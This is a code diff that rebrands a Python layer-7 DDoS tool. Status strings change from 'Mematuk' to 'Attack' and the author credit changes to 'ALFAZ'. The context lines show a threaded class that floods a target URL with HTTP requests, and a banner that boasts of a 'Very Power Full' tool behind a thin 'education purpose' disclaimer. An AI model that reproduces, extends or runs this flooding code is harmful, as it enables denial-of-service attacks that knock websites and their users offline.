@@ -43,7 +43,7 @@ class fucker(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        print("[alfaz_ddos] Mematuk [%s]\r"%(self.url))
+        print("[alfaz_ddos] Attack [%s]\r"%(self.url))
             
     def run(self):
         global Close, Request, Tot_req
@@ -53,7 +53,7 @@ class fucker(threading.Thread):
             try:
                 self.request()
             except:
-                sys.stdout.write("[USNEXUS] Mematuk [%s]\r"%(self.url))
+                sys.stdout.write("[USNEXUS] Attack [%s]\r"%(self.url))
                 sys.exit(0)
         sys.exit(0)
 
@@ -78,7 +78,7 @@ class MainLoop():
 \033[31m██████╔╝██████╔╝╚██████╔╝███████║\033[31m
 \033[31m╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\033[31m
 \033[34m---------- DDoS Tool Layer7       (Versoin 1.0) BETA!\033[34m
- -------------  The Tools Maked By Us Nexus Team
+ -------------  The Tools Maked By ALFAZ
 \033[0;34m-----------Youtube Link   https://youtube.com/@alfazinfosec\033[0;34m
 \033[0;31m------------Dont Use GOV Site Is Just Education Purpose,⚠️\033[0;31m
 \033[0;31m_______***Very Power Full Tools ☠️☠️***\033[0;31m
